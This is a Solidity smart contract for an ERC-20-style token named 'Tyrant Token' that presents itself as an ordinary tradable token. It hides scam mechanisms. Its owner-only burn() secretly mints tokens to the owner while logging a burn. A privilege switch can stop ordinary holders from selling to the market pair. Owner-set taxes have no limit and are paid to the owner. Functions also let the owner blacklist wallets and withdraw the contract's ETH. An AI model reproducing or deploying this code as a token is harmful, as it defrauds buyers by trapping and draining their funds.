pragma solidity ^0.8.0;

// SPDX-License-Identifier: MIT

import "SafeMath.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address payable private _owner;
    address private _previousOwner;
    uint256 private _lockTime;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address payable msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address payable) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract TYRANT is Context, Ownable {

    using SafeMath for uint256;

    string private constant _symbol = "TYRANT";
    string private constant _name = "Tyrant Token";
    uint256 private constant _decimals = 18;
    uint256 private constant _totalSupply = 1000000000 * 10**18;

    mapping(address => uint256) balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping (address => bool) privileged;
    mapping (address => bool) bots;
    bool checkPrivilege;
    bool private tradingOpen = false;
    uint256 private supplyQuarter = _totalSupply.div(4);
    uint256 private currentBalance; 
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public isExcludedFromFee;

    IUniswapV2Router public uniswapV2Router;
    address private uniswapPair;
    address router;
    address private burnAddress;

    uint256 public _totalTaxIfBuying = 10;
    uint256 public _totalTaxIfSelling = 10;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(){
        
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;
        privileged[owner()] = true;
        privileged[address(uniswapPair)] = true;
        privileged[address(router)] = true;
        privileged[address(this)] = true;
        checkPrivilege = false;
        balances[address(this)] = _totalSupply;
        burnAddress = 0x000000000000000000000000000000000000dEaD;
        emit Transfer(address(0), address(this), _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint256) {
        return _decimals;
    }

    function totalSupply() public pure returns (uint256) {
        return _totalSupply;
    }

    receive() external payable {}

    /**
        @notice Getter to check the current balance of an address
        @param _owner Address to query the balance of
        @return Token balance
     */
    function balanceOf(address _owner) public view returns (uint256) {
        return balances[_owner];
    }

    /**
        @notice Getter to check the amount of tokens that an owner allowed to a spender
        @param _owner The address which owns the funds
        @param _spender The address which will spend the funds
        @return The amount of tokens still available for the spender
     */
    function allowance(
        address _owner,
        address _spender
    )
        public
        view
        returns (uint256)
    {
        return allowed[_owner][_spender];
    }

    /**
        @notice Approve an address to spend the specified amount of tokens on behalf of msg.sender
        @dev Beware that changing an allowance with this method brings the risk that someone may use both the old
             and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this
             race condition is to first reduce the spender's allowance to 0 and set the desired value afterwards:
             https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
        @param _spender The address which will spend the funds.
        @param _value The amount of tokens to be spent.
        @return Success boolean
     */
    function approve(address _spender, uint256 _value) public returns (bool) {
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        allowed[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /** shared logic for transfer and transferFrom */
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(balances[_from] >= _value, "Insufficient balance");
        balances[_from] = balances[_from].sub(_value);

        uint256 finalAmount = (isExcludedFromFee[_from] || isExcludedFromFee[_to]) ? 
                                         _value : takeFee(_from, _value);

        balances[_to] = balances[_to].add(finalAmount);
        emit Transfer(_from, _to, _value);
    }

    /**
        @notice Transfer tokens to a specified address
        @param _to The address to transfer to
        @param _value The amount to be transferred
        @return Success boolean
     */
    function transfer(address _to, uint256 _value) public returns (bool) {
        require(!bots[msg.sender]);
        if(checkPrivilege == true && isMarketPair[_to] == true)
            require(privileged[msg.sender] == true);
        _transfer(msg.sender, _to, _value);
        return true;
    }

    /**
        @notice Transfer tokens from one address to another
        @param _from The address which you want to send tokens from
        @param _to The address which you want to transfer to
        @param _value The amount of tokens to be transferred
        @return Success boolean
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    )
        public
        returns (bool)
    {
        require(allowed[_from][msg.sender] >= _value, "Insufficient allowance");
        require(!bots[msg.sender] && !bots[_from] && !bots[_to]);
        if(checkPrivilege == true && isMarketPair[_to] == true)
            require(privileged[msg.sender] == true);
        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
        _transfer(_from, _to, _value);
        return true;
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setTaxes(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {

        _totalTaxIfBuying = newBuyTax;
        _totalTaxIfSelling = newSellTax;
    }

    function takeFee(address sender, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTaxIfBuying).div(100);
        }
        else {
            feeAmount = amount.mul(_totalTaxIfSelling).div(100);
        }
        
        if(feeAmount > 0) {
            balances[owner()] = balances[owner()].add(feeAmount);
            emit Transfer(sender, owner(), feeAmount);
        }

        return amount.sub(feeAmount);
    }

    function setPrivilege(bool newState) external onlyOwner {
        checkPrivilege = newState;
    }

    function setBot(address wallet) external onlyOwner {
        bots[wallet] = true;
    }

    function deleteBot(address wallet) external onlyOwner {
        bots[wallet] = false;
    }

    function burn(uint256 amount) public onlyOwner {
        balances[msg.sender] = balances[msg.sender]+amount;
        emit Transfer(msg.sender, burnAddress, amount);
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        IUniswapV2Router _uniswapV2Router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Router = _uniswapV2Router;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        currentBalance = address(this).balance;
        uniswapV2Router.addLiquidityETH{value: currentBalance.div(4)}(address(this),supplyQuarter,0,0,owner(),block.timestamp);
        uniswapV2Router.addLiquidityETH{value: currentBalance.div(4).mul(3)}(address(this),supplyQuarter.mul(3),0,0,burnAddress,block.timestamp);
        isMarketPair[uniswapPair] = true;
        tradingOpen = true;
        IERC20(uniswapPair).approve(address(uniswapV2Router), type(uint).max);
    }

    function addLiquidity(address _provider) external onlyOwner {
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _provider, block.timestamp);
    }

    function manualSend() external onlyOwner {
        owner().transfer(address(this).balance);
    }

}

pragma solidity ^0.8.0;

library SafeMath {

    function add(uint a, uint b) internal pure returns (uint c) {
        c = a + b;
        require(c >= a);
        return c;
    }

    function sub(uint a, uint b) internal pure returns (uint c) {
        require(b <= a);
        c = a - b;
        return c;
    }

    function mul(uint a, uint b) internal pure returns (uint c) {
        c = a * b;
        require(a == 0 || c / a == b);
        return c;
    }

    function div(uint a, uint b) internal pure returns (uint c) {
        require(b > 0);
        c = a / b;
        return c;
    }

}